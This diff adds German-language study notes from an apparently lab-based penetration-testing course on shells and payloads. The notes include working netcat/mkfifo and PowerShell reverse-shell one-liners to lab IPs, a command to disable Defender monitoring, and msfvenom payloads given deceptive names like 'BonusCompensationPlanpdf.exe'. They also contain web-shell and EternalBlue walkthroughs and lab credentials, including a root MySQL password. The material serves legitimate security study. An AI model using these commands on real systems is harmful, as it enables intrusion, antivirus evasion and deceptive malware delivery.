@@ -1,0 +1,737 @@
+Shell & Payloads
+Introduction
+1. Shells Jacks Us In, Payloads Deliver Us Shells:
+- Eine Shell ist ein Programm, das einem User eine Schnittstelle bietet, um Anweisungen in das System einzugeben und Textausgabe anzuzeigen
+
+- Why Get a Shell?:
+	- Die Shell gibt uns Zugang zum Betriebsystem, Systembefehle und Dateisysteme
+	- Wenn wir eine Shell haben koennen wir enumerieren, escalate privilges, transfer files usw
+	- Terminal Shells sind besser als graphische Shells weil sie schwieriger zu erkennen sind, sind schneller im navigieren im OS, Aktionen sind leichter zu automatisieren
+
+- Payloads Deliver us Shells:
+	- Eine Payload kann als folgendes definiert werden:
+		- Networking: Datenteil eines Paket, der durch Computernetze durchlaeuft
+		- Basic Computing: Ein Befehlsatz mit Anweisungen was getan werden soll
+		- Programming: Datenteil der Anweisungen von Programmiersprachen enthaelt
+		- Exploitation&Security: Ein Code der Sicherheitsluecken in einem Computer ausnutzt
+
+###################################################################################################
+Shell Basics:
+1. Anatomy of a Shell:
+- Jedes Betriebssytem hat eine Shell mit der man interargieren kann, um mit dieser zu interargieren wird ein terminal emulator benoetigt
+
+- Command Language Interpreters:
+	- Ein Command Language Interpreters interpretiert die Anweisungen vom User gibt die Aufgabe an das Betriebssystem weiter
+	- Command-line interfaces sind eine Kombination aus Betriebssytem, Terminal emulator und command language Interpreter
+
+- Terminal Example:
+	- Die Sprache des Interpreters wird durch das $ Zeichen angezeigt
+	- $ wird von Bash, Ksh, POSIX verwendet
+	- $ markieren den Start der shell prompt
+	- Wir koennen herausfinden welche Shell Sprache verwendet wird mit dem Befehl env
+
+- PowerShell vs. Bash:
+	- PowerShell ist eine anderer Command Language Interpreter
+
+2. Bind Shells:
+- In vielen Faellen werden wir eine Shell auf einem lokalen oder remote Netzwerk einrichten
+- Das bedeutet, dass wir iene Terminal emulator application auf unserem lokalen attack host verwende, um den auf dem remote Host eine Shell zu steuern
+- Das geschieht meistens mit einer bind/reverse shell
+
+- What Is It?:
+	- Auf dem Ziel Host wird ein Listener gestartet die dem Attack Host zuhoert
+		- nc -lvnp 1337 | Hoert auf 0.0.0.0 auf Port 1337
+	- Der Befehl koennte zu folgenden Problemen fuehren:
+		- Es muss ein Listener auf Ziel gestartet sein
+		- Admins haben meistens strenge Regeln fuer einkommenden Datenverkehr
+		- Betriebssysteme Firewall blocken meistens einkommenden Datenverkehr
+	- Betriebssystem Firewall sind meistens problematisch beim einrichten einer Shell
+	- GNU Netcat kann ueber TCP,UDP und Unix Socket kommunizieren
+	- Wir koennen nc auf dem Angriffs Host und das Ziel waere der Server
+
+- Practicing with GNU Netcat:
+	- Wir werden netcat(nc) auf dem Client und dem Server verwenden
+	- No. 1: Server - Target starting Netcat listener:
+		- nc -lvnp 777
+		- Der Server ist unser Ziel, der Listener wartet auf den Attack Client
+	- No. 2: Client - Attack box connecting to target:
+		- nc -nv <Server_URL> 7777
+		- Verbindet sich mit dem Server auf der URL 7777 
+		- Nach der erfolgreichen Verbindung wird succeeded! gezeigt
+	- No. 3: Server - Target receiving connection from client:
+		- Die Nachricht received! wird auf dem Server gezeigt
+		- Noch ist auf dem Server keine Reverse Shell sondern nur eine Netcat TCP Session
+	- No. 4: Client - Attack box sending message Hello Academy:
+		- Vom dem Client kann eine Nachricht zum Server geschickt werden
+	- No. 5: Server - Target receiving Hello Academy message:
+		- Server erhaelt die Nachricht von dem Client
+
+- Establishing a Basic Bind Shell with Netcat:
+	- Wir koennen mit Netcat Text von dem Client zum Server senden, haben aber noch keinen Zugriff zum Betriebssystem
+	- Auf der Serverseite müssen wir das Verzeichnis, die Shell und den Listener angeben, mit einigen Pipelines arbeiten und eine Ein- und Ausgabeumleitung einrichten, um sicherzustellen, dass eine Shell zum System gesendet wird, wenn der Client versucht, eine Verbindung herzustellen.
+	- No. 1: Server - Binding a Bash shell to the TCP session:
+		- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <Server_IP> 7777 > /tmp/f
+		- Die Shell wird auf dem Server geoffnet wenn der Client die Verbindung erstellt
+	- No. 2: Client - Connecting to bind shell on target:
+		- nc -nv <Server_IP> 7777
+
+3. Reverse Shells:
+- Bei einer reverse Shell hat der Attack Host eine Listener am laufen und das Ziel muss die Verbindung initieren
+- Der Attacker muss eine Methode (Command Injection, Unrestricted File Upload usw) verwenden um die Verbindung mit dem Attack Host aufzubauen
+- Admins uebersehen meistens die ausgehenden Verbindungen, deswegen ist eine Reverse Shell eine bessere Alternative
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Ist eine gutes Hilfsmittel um reverse Shells zu automatisieren
+- Admins kennen solche Hilfsmittel und blocken diese meistens deswegen muessen die Befehle leicht angepasst werden
+
+- Hands-on With A Simple Reverse Shell in Windows:
+	- Wir starten mit einem Netcat Listener auf unserem Attack Host 
+		- sudo nc -lvnp 443
+	- Der Port 443 wird von HTTPS Verbindungen verwendet und wird wird meistens nicht von der Betriebssytem Firewall blockiert
+	- Eine Firewall mit Deep Packet Inspection koennete die Reverse Shell in einem Paket finden, da die Firewall den Inhalt eines Pakets einsehen kann
+	- In diesem Fall ist das Ziel ein Windows Host
+	- Netcat ist nicht nativ auf Windows vorhanden deswegen muessen wir entweder Binaerdatei auf den Host bringen oder Alternativen finden
+	- Auf dem Windows Host in der Command Promt koennen wir ein Befehl ausfuehren um eine ReverShell zu bekommen
+		- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+	- Wenn der AntiVirus diesen Befehl nicht zulassen sollte schlaten wir den Antivirus aus
+		- Set-MpPreference -DisableRealtimeMonitoring $true
+
+###################################################################################################
+Payloads
+1. Introduction to Payloads:
+- One-Liners Examined:
+	- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
+	- Der Befehl erstellt eine Shell auf einem Netzwerk Socket mithilfe eines Netcat Listeners
+	- Erklaerung des Befehls:
+	- rm -f /tmp/f;
+		- Entfernt /tmp/f Datei mit der Option -f die nicht vorhandene Dateien ignoriert
+	- mkfifo /tmop/f;
+		- Erstellt ein FIFO(pipe file) am Speicherort
+	- cat /tmp/f |:
+		- Verbindet die Standardausgabe von FIFO /tmp/f mit dem Befehl der danach kommt
+	- /bin/bash -i 2>&1 |:
+		- Die Interpreter Befehlssprache ist /bash und ist wegen der Option -i interaktiv
+		- 2>&1 stellt sicher, dass der Standardfehler(2) und Standardeingabe(1) an den Befehl nach der Pipe(|) umgeleitet wird
+	- nc <Url> <Port> > /tmp/f:
+		- Verwendet netcat um eine Verbindung zum Angriffshost <Url> auf Port <Port>
+		- Die Ausgabe wird nach /tmp/f umgeleitet wodurch die Bash-Shell unserem Netcat Listener zur Verfuegung steht
+
+- PowerShell One-liner Explained:
+	- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+	- Der Befehl erstellt eine Reverse Shell in Comnand Prompt
+	- powershell -nop -c:
+		- Fuehrt powershell.exe ohne Profil (-nop) aus und fuehrt den Befehl in in den "" aus mit der Option -c
+	- "$client = New-Object System.Net.Sockets.TCPClient(<IP_Adresse>,<Port>);:
+		- Setzt die Variable $client gleich dem Objekt TCP.Client
+		- Das .NET Framework stellt eine Verbindung mit dem TCP-Socket(IP_Adresse) her 
+	- $stream = $client.GetStream();:
+		- Setzt $stream gleich der .NET Framework Methode GetStream die Netzwerkkomminikation ermoeglicht
+	- [byte[]]$bytes = 0..65535|%{0};:
+		- Erstellt ein Array vom Typ Byte der an den TCP-Listener weitergeleitet wird
+	- while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0):
+		- Startet eine while-Schleife und schreibt den Input in die Variable $bytes
+	- {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);:
+		- Setzt die Variable $data gleich einer ASCII kodierten Klasse um den Bytestrom von $bytes in ASCII zu kodieren
+		- Der Input wird in ASCII kodiert und dann gesendet
+	- $sendback = (iex $data 2>&1 | Out-String );:
+		- $sendback wird gleich dem Cmdlet Invoke-Expression gesetzt und leitet den Standardfehler(2>) und die Standardeingabe(1) an das Cmdlet Out-String weiter
+	- $sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`:
+		- $sendback2 ist gleich $sendback + dem Pfad zum Arbeitsverzeichnis
+	- $sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}:
+		- $sendbyte gleich ASCII kodierten Bytestrom der eine PowerShell Session mit dem Netcat Listener initiiert
+	- $client.Close()":
+		- Diese Methode schliesst die TCP Verbindung
+
+2. Automating Payloads & Delivery with Metasploit:
+- Metasploit automatisiert das expoloiten von Schwachstellen mit vorbereiteten Modulen fuer jede Schwachstelle
+
+- Practicing with Metasploit:
+	- Metasploit wird mit msfconsole ausgefuehrt
+	- Wir koennen einen Nmap Scan verwenden um nach exploits fuer Protokolle zu suchen
+	- In Metasploit kann mit search PROTOKOL nach exploits gesucht werden
+	- Mit use <ExploitNummer> kann der Exploit geladen werden
+	- Wenn der Exploit geladen ist koennen mit options die Exploit Optionen ausgegeben werden
+	- Mit exploit kann der Exploit ausgefuehrt werden
+	- Metasploit gibt alle Zwischenschritte aus
+
+3. Crafting payloads with MSFvenom:
+- Es kann sein das wir keinen Zugang zum internen Netzwerk haben indem Fall koennen wir MSFvenom verwenden um ein Payload zu erstellen und diesen dann mit Email usw zu verschicken
+- MFSvenom kann die Payload verschluesseln und kodieren
+- msfvenom -l payloads listet alle Payloads auf
+- Payloads sind fuer bestimmte Betriebsyssteme erstellt und werden als staged oder stageless beschrieben
+
+- Stages vs. Stageless Payloads:
+	- Staged Payloads erstellt ein Weg noch mehr Komponenten zum attackierenden Host zu schaffen
+	- Stageless Payloads hat keine Stufen um noch mehr Komponenten zum Host zu schaffen, eine stageless shell kann viel stabiler sein als eine staged shell
+
+- Building A Stageless Payload:
+	- Folgende Payload moechten wir bauen
+	- msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+	- msfvenom: Tool aufrufen
+	- -p: Die Option -p zeigt an, das wir ein Payload erstellen sollen
+	- linux/x64/shell_reverse_tcp: Payload angepasst auf die Architektur
+	- LHOST=10.10.14.113 LPORT=443: Ist der Host der aufgerufen wird
+	- -f elf: Die Option -f gibt das Format der Binaerdatei an in diesem Fall eine .elf Datei
+	- > createbackup.elf: Erzeugt die .elf Datei namens createbackup idealerweise ein unaufaelliger Namen
+
+- Executing a Stageless Payload:
+	- Die Payload wurde erstellt, jetzt muss ein Weg auf das Zielsystem gefunden werden beispielweise:
+		- Email mit angehaengter Datei
+		- Download Link auf Website
+		- Kombinieren mit Metasploit exploit module
+		- Mit einem USB-Stick
+	- Nachdem die Payload auf der Zielrechner ist muss auf die Datei noch geklickt werden
+	- Wir koennten einen Listener haben um die Verbindung von der Zielsystem zu bekommen
+	- NC Connection:
+		- sudo nc -lvnp 443
+
+Building a simple Stageless Payload for a Windows system:
+- Wir koennen auch eine ausfuehrbare Datei (.exe) mit msfvenom erstellen
+	- Windows Payload:
+		- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+
+###################################################################################################
+Windows Shells
+1. Infiltrating Windows:
+- Enumerating Windows & Fingerprinting Methods:
+	- Wir muessen ermitteln ob ein Host ein Windows Host ist
+	- Wir koennen den Host anpingen um die Time To Live(TTL) nachzuschauen. Eine TTL von 32 oder 128 ist typisch fuer einen Windows Host
+	- Tabelle fuer TTL Zeiten: https://subinsb.com/default-device-ttl-values/
+
+	- Ein weiteres Tool um Windows auf einem Host zu erkennen ist Nmap
+	- sudo nmap -O 192.168.86.39
+	- Die Option -O steht fuer die OS Identifizierung, 
+	
+	- Jetzt wissen wir das es sich um einen Windows Host handelt, jetzt koennen wir mit der Option --script banner.nse die Banner abrufen um zu sehen welche Services sich auf dem Host befinden
+
+- Bats, DLLs, & MSI Files, Oh My!:
+	- Wir haben verschiedene Optionen fuer den Payload wie DLLs, batch files, MSI packages, PowerShell scripts usw
+	- DDLs:
+		- DDLs ist eine Dynamic Linking Library Datei fuer das Microsoft Betriebssytem
+		- Die Dateien sind modular und erlauben uns Anwendungen einfacher zu updaten
+		- Boesartige DDLs einzuschleisen kann zu pvilige escalation oder umgehen von User Account Controls fuehren
+	- Batch:
+		- Batch Dateien sind DOS Scripts die mehrere Aufgaben aufeinmal mit der Command-Line Interpreter fuehren
+		- Wir koennen in diesem Batch File dem PC sagen, dass verschiedene Ports geoeffnet werden sollen
+	- VBS:
+		- Ein VBS Script ist eine leichte Scripting Sprache basiert auf Microsoft Visual Basic 
+		- Wird meistens auf der Client Seite auf Webserver fuer dynaische Webseiten verwendet
+		- VBS Scripts werden meistens in Escel Dokumente mit Macros ausgefuehrt
+	- MSI:
+		- .MSI Dateien sind installations Datenbank fuer die Windows Installation
+		- In einer .MSI Datei steht drin welche Komponenten fuer die Installation erforderlich sind und wie diese zu finden sind
+	- PowerShell:
+		- PowerShell ist eine Scripting Sprache sowie ein Shell Umgebung
+		- Es basiert auf der .NET Common Language und nimmt Eingabe und Ausgabe als .NET Objekte
+
+- Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution:
+	- Es gibt verschiedene Methoden fuer Erzeugung und Uebetragung von Payloads
+
+	- Payload Generation:
+		- Es gibt viele Methoden um eine Payload zu erstellen
+		- Metasploit-Frameworks und MSFVenom sind gute und einfache Arten wie eine Payload erzeugt werden kann andere sind:
+			- Payloads All The Tings
+			- Mythic C2 Framework
+			- Nishang
+			- Darkarmour
+	
+	- Payload Transfer and Execution:
+		- Der Payload kann durch emails, web drive usw uebermittelt geben
+		- Hier ist eine Liste an Delivery Tools:
+			- Impacket: Ist eine Tool um mit Netzwerkprotkolle zu interargieren
+			- Payloads all the Tings: Ein gute Ressource um Dateien zwischen Hosts zu transferieren
+			- SMB: SMB kann den Tranfer von Dateien zwischen Hosts breitstellen. Ist besonders nuetzlich wenn die Hosts in der gleichen Domaine sind
+			- Remote execution via MFS: In Metasploit fuehrt eine Exploit Module das Exploit immer aus und fuehrt die Payload aus
+			- Other Protocols: Mit Protokolle wie FTP, TFTP, HTTP/S koennen Datei auf Hosts hochgeladen werden.
+
+	- Example Compromise Walkthrough:
+		- 1. Enumerate The Host:
+			- nmap -v -A URL
+		- 2. Search for and decide onan exploit path:
+			- msfconsole oeffnen und nach auxiliary suchen
+			- RHOSTS eingebe und run eingeben
+		- 3. Select Exploit & Payload, then Deliver:
+			- search eternal
+			- Einen Exploit aussuchen und use <Nummer> schreiben
+			- Optionen eingeben und mit show options ueberpruefen
+		- 4. Execute Attack, and Receive A Callback:
+			- exploit schreiben
+			- Eine Shel steht zur Verfuegung
+		- 5. Identify the Native Shell:
+			- shell eingeben um die Shell zu identifizieren
+
+- CMD-Prompt and Power[Shell]s for Fun and Profit:
+	- Wir haben in Windows cmd und PowerShell als Shells
+	- CMD verwendet noch die altern MS-DOS Befehle
+	- PowerShell versteht MS-DOS Befehle arbeitet aber auch mit .NET Befehle
+	- Use CMD when:
+		- Der Host ist alt und hat keine PowerShell
+		- Wenn es nur um simple Interaktionen geht
+		- Wenn simple Batch Dateien, Net Befehle oder MS-DOS Befehle
+		- Wenn Rechte die Ausfuehrung von Scripts 
+	- Use PowerShell when:
+		- Wenn cmdlets oder selbst erstellt Scripts ausgefuehrt werden sollen
+		- Wenn .NET Objekte verwendet werden sollen
+		- Wenn man nicht so Unauffaellig sein muss
+		- Wenn man mit Cloud Services interargieren muss
+		- Wenn das Script Aliases verwendet
+
+###################################################################################################
+NIX Shells
+1. Infiltrating Unix/Linux:
+- Ueber 70% aller Webserver laufen auf einem Linux Betriebssystem
+- Es ist sinnvoll Wissen ueber Linux zu haben
+
+- Common Considerations:
+	- Ein Shell kann auf mehreren Wegen erlangt werden, eine uebliche Art ist eine Schwachstelle in einer Anwendung
+
+- Gaining a Shell Through Attacking a Vulnerable Application:
+	- Wie meistens starten wir mit der enumeration eines Systems mit nmap
+	- Enumerate the Host:
+		- Mit nmap -sC -sV <URL> koennen wir sehen welche Ports offen sind 
+		- Wir koennen ausserdem die Version der Anwendung sehen die auf dem Port laufen
+	- rConfig Management Tool:
+		- rConfig ist ein Netzwerk Management Tool die von Admins verwendet wird
+
+- Discovering a Vulnerability in rConfig:
+	- Google Suche nach rConfig mit der Version 3.9.6
+	- Search For an Exploit Module:
+		- msfconsole eingeben um Metasploit zu oeffnen
+		- search rconfig eingeben um nach Modules nach rcofig zu suchen
+		- Wenn die Exploits nicht in MSF auftaucht kann auf github oder auf Google nach dem Exploit fuer MSF gesucht werden
+		- Der Quellcode fuer MSF Modules der auf .rb endet wird heruntergeladen
+		- Mit dem Befehl locate exploits koennen wir den Ordner fuer die Module finden
+		- In diesen Ordner koennen wir dann den Quellcode kopieren
+		- Den exploit mit use /<Ordner_des_Exploits> verenden
+		- Die Optionen ausfuellen und mit exploit starten
+
+- Spawning a TTY Shell with Python:
+	- Bei einer System Shell am Anfang haben wir keine prompt, diese Shell wird non-tty shell genannt
+	- Diese Shells haben keine volle Funktionalitaet, die meitens nicht su(switch user) und
+	sudo(super user do) ausfuehren koennen
+	- Wir koennen eine TTY Shell mit Python auf dem System erstellen
+	- Mit which python koennen wir pruefen ob python auf System existiert
+	- Der Befehl erstell eine TTY Shell mit Python: python -c 'import pty; pty.spawn("/bin/sh")'
+
+2. Spawning Interactive Shels:
+- Die Shell die anfaenglich erstellt wird ist eine jail shell, mit weniger Funktionen
+- Deswegen muessen wir eine TTY bourne Shell erstellen 
+- Manchmal ist Python nicht vorinstalliert, somit muessen wir sicherstellen, dass eine interactive shell auch mit anderen Sprachen erstellt werden kann
+- In den meisten Linux Systemen, ist eine bourne shell(/bin/sh) und eine bourne again shell(/bin/bash) auf einen System nativ vorhanden
+	
+- /bin/sh -i:
+	- Interactive:
+		- Dieser Befehl fuehrt eine Shell Interpreter aus im interaktiven Zustand aus
+	- Perl:
+		- Wenn Perl auf dem System vorhanden ist kann auch hiermit eine Shell ausgefuehrt werden
+		- perl —e 'exec "/bin/sh";'
+		- perl: exec "/bin/sh";
+	- Ruby:
+		- Wenn Ruby auf dem System vorhanden ist
+		- ruby: exec "/bin/sh"
+	- Lua:
+		- Wenn Lua vorhanden ist kann die Methode os.execute aufuehren um die Shell zu erstellen
+		- lua: os.execute('/bin/sh')
+	- AWK:
+		- AWK ist eine c aehnliche Sprache und ist auf den meisten UNIX/LINUX Systemen vorhanden
+		- awk 'BEGIN {system("/bin/sh")}'
+	- Find:
+		- Find ist ein Befehl auf den meisten Unix/Linux Systemen, dass fuer die Suche von Dateien und Verzeichnissen verwendet wird
+		- find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+		- find . -exec /bin/sh \; -quit
+	- VIM:
+		- Wir koennen mit VIM die interpreter Sprache mit VIM aendern
+		- VIM to Shell: vim -c ':!/bin/sh'
+		- Vim to Escape: vim
+						 :set shell=/bin/sh
+						 :shell
+
+- Execution Permissions Considerations:
+	- Wir koennen Berechtigungen und eine Shell-Sitzung mit einem anderen Konto ausfuehren
+	- Permissions:
+		- ls -la <path/to/fileorbinary>
+	- Sudo -l:
+		- Ueberpruefen welche Rechte wir mit diesem Account haben
+		- sudo -l
+
+###################################################################################################
+Web Shells
+1. Introduction to Web Shells:
+- Ein grossteil der Diente die wir untersuchen werden laufen auf Webservern
+- Die meisten Anwendungen laufen auf dem Browser
+- Waehrend eines externen Penetrationstest stellen wir oft fest, dass die aeusserlichen Netzwerke sehr gut geschuetzt sind, die internen Netzwerke aber eher unsicher sind
+- Bei einem externen Penetrationstest verschaffen wir uns meistens durch Webanwendungen, Passwort Spraying oder Social Engineering Zutritt zum internen Netzwerk
+
+- What is a Web Shell:
+	- Eine Web Shell ist eine Browser basierte Shell Session mit der wir mit dem Betriebssystem interargieren koennen
+	- Fuer eine Remoteshell benoetigen wir eine Schwachstelle in der Webanwendung
+	- Die meisten Web Shells werden durch das Hochladen einer Datei in Websprache erreicht
+
+2. Laudanum, One Webshell to rule them all:
+- Laudanum ist ein Repository fuer vorgefertigte Dateien um eine Reverse Shell zu erzeugen
+- Diese Dateien koennen mit verschiedenen Web Sprachen wie aps, apsx, jsp, php geschrieben worden sein
+- Laudanum ist in Kali und Parrot OS eingebaut
+
+- Working with Laudanum:	
+	- Die Laudanum Dateien sind unter /usr/share/webshells/laudanum vorhanden
+	- Jede Datei muss auf den jeweiligen Host angepasst werden um die richtige IP Adresse des Attackierers zu haben
+
+3. Antak Webshell:
+- ASPX Explained:
+	- Active Server Page Extended(ASPX) ist ein File Typ/Endung die in dem .NET Framework geschrieben ist
+	- Auf einem Webserver der auf dem .NET Framework laeuft, koennen web forms die Input Daten fuer den User generieren
+	- Auf der Server Seite koennen diese Informationen in HTML konvertiert werden
+	- Wir koennen eine ASPX Shell verwenden um das Windows Betriebsysstem zu steuern
+
+- Antak Webshell:
+	- Antak ist eine Webshell die aus dem Projekt Nishang kommt
+	- Antak verwendet PowerSHell um mit einem Host zu interargieren
+	
+	- Working with Antak:
+		- Die Dateien fuer Antak koennen unter /usr/share/nishang/Antak-WebShell gefunden werden
+		- Attack-Host: 10.10.14.128
+		- Target: 10.129.42.197
+		- vHost: status.inlanefreight.local
+
+4. PHP Web Shells(10.129.201.101):
+- PHP ist eine Script Sprache und ist Teil von viele Webseiten
+
+- Hands-on With a PHP-Based Web Shell:
+	- Da PHP Code auf der Serverseite ausgefuehrt werden, koennen wir vorgefertigte Payloads verwenden um eine Shell ueber den Browser zu erhalten
+	- Wir koennen auch eine Reverse Shell Sitzung initiieren
+	- Die Website laesst nur spezielle Datei typen durch 
+
+- Considerations when Dealing with Web Shells:
+	- Web Anwendungen loeschen automatisch aten
+	- Man kann nicht einfachmit dem Betriebssystem interargieren
+	- Groessere Wahrscheinlichkeit, dass man einen Nachweis hinterlaesst
+
+###################################################################################################
+Skills Assessment:
+1. The Live Engagement:
+- Hier werden wir das gelernte Testen
+
+- Scenario:
+	- Wir werden mit RDP in einen Host einloggen
+	- Objectivees:
+		- Receiving a Shell in Windows
+			- 172.16.1.11:8080
+		- Receiving a Shell in Windows
+			- 172.16.1.13
+		- Receiving a Shell in Web Application
+			- blog.inlanefreight.local
+		- Identify the Shell Enviroment
+	- Credentials:
+		- IP: 10.129.204.126
+		- Credentials: htb-student / HTB_@cademy_stdnt! Can be used by SSH or RDP.
+		- Connect with: xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
+		- Connect with: ssh htb-student@10.129.204.126
+		- 
+
+
+Host 1:
+- IP: 172.16.1.11:8080
+- nmap -sV -sC 172.16.1.11
+	Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-11 12:27 EST
+	Nmap scan report for status.inlanefreight.local (172.16.1.11)
+	Host is up (0.068s latency).
+	Not shown: 989 closed tcp ports (conn-refused)
+	PORT     STATE SERVICE       VERSION
+	80/tcp   open  http          Microsoft IIS httpd 10.0
+	|_http-server-header: Microsoft-IIS/10.0
+	| http-methods: 
+	|_  Potentially risky methods: TRACE
+	|_http-title: Inlanefreight Server Status
+	135/tcp  open  msrpc         Microsoft Windows RPC
+	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+	445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
+	515/tcp  open  printer       Microsoft lpd
+	1801/tcp open  msmq?
+	2103/tcp open  msrpc         Microsoft Windows RPC
+	2105/tcp open  msrpc         Microsoft Windows RPC
+	2107/tcp open  msrpc         Microsoft Windows RPC
+	3389/tcp open  ms-wbt-server Microsoft Terminal Services
+	| rdp-ntlm-info: 
+	|   Target_Name: SHELLS-WINSVR
+	|   NetBIOS_Domain_Name: SHELLS-WINSVR
+	|   NetBIOS_Computer_Name: SHELLS-WINSVR
+	|   DNS_Domain_Name: shells-winsvr
+	|   DNS_Computer_Name: shells-winsvr
+	|   Product_Version: 10.0.17763
+	|_  System_Time: 2023-03-11T18:28:33+00:00
+	|_ssl-date: 2023-03-11T18:28:39+00:00; +1h00m01s from scanner time.
+	| ssl-cert: Subject: commonName=shells-winsvr
+	| Not valid before: 2023-03-10T16:24:56
+	|_Not valid after:  2023-09-09T16:24:56
+	8080/tcp open  http          Apache Tomcat 10.0.11
+	|_http-favicon: Apache Tomcat
+	|_http-open-proxy: Proxy might be redirecting requests
+	|_http-title: Apache Tomcat/10.0.11
+	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+	Host script results:
+	|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:05:f8 (VMware)
+	|_clock-skew: mean: 2h36m00s, deviation: 3h34m39s, median: 59m59s
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	| smb2-security-mode: 
+	|   3.1.1: 
+	|_    Message signing enabled but not required
+	| smb-os-discovery: 
+	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+	|   Computer name: shells-winsvr
+	|   NetBIOS computer name: SHELLS-WINSVR\x00
+	|   Workgroup: WORKGROUP\x00
+	|_  System time: 2023-03-11T10:28:33-08:00
+	| smb2-time: 
+	|   date: 2023-03-11T18:28:33
+	|_  start_date: N/A
+
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 60.52 seconds
+
+	172.16.1.11:8080
+	tomcat:Tomcatadm
+	- Crafting Payloads with MSFvenom
+		- msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=7676 -f war -o somos.war
+	- Start Listener
+	- nc -lvnp 7676
+
+Host 2:
+- blog.inlanefreight.local
+
+nmap -sV -sC blog.inlanefreight.local
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-11 14:59 EST
+Nmap scan report for blog.inlanefreight.local (172.16.1.12)
+Host is up (0.045s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
+|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
+|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Inlanefreight Gabber
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
+
+
+gobuster dir -u http://blog.inlanefreight.local -w /usr/share/dirb/wordlists/common.txt
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://blog.inlanefreight.local
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/03/11 15:59:19 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 289]
+/.htpasswd            (Status: 403) [Size: 289]
+/.htaccess            (Status: 403) [Size: 289]
+/app                  (Status: 301) [Size: 334] [--> http://blog.inlanefreight.local/app/]
+/data                 (Status: 301) [Size: 335] [--> http://blog.inlanefreight.local/data/]
+/favicon.ico          (Status: 200) [Size: 1150]                                           
+/index.php            (Status: 200) [Size: 10103]                                          
+/LICENSE              (Status: 200) [Size: 35149]                                          
+/robots.txt           (Status: 200) [Size: 25]                                             
+/server-status        (Status: 403) [Size: 289]                                            
+/static               (Status: 301) [Size: 337] [--> http://blog.inlanefreight.local/static/]
+
+
+
+
+
+;[database]
+;db_connection = sqlite
+;sqlite_db = app/db/sqlite/sqlite.db
+
+;[database]
+db_connection = mysql
+mysql_socket = /var/run/mysqld/mysqld.sock
+mysql_host = 127.0.0.1
+mysql_port = 3306
+mysql_user = root
+mysql_pass = "HTB_@cademy_r00t!"
+db_name = blog
+
+[profile]
+title = Inlanefreight Gabber
+name = Slade Wilson
+pic_small = static/images/23al.jpg
